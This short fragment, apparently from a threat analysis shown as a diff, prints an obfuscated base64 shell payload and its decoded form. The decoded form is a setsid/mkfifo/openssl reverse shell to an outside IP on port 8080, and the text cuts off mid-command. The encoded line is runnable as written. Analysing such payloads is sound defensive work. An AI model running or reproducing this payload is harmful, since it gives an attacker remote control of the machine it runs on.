@@ -1,0 +1,5 @@
+'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29u bmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCA+L3RtcC9wIDI+L2Rldi9udWxsO3JtIC90bXAvcCI=;ee=ba;G=s;"ech"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'
+--End Encoded Payload--
+The encoded block above decodes to a reverse shell seen below.
+--Begin Decoded Command--
+setsid sh -c "mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107[.]148[.]223[.]196:8080 >/tmp/p 2>/dev/null;rm
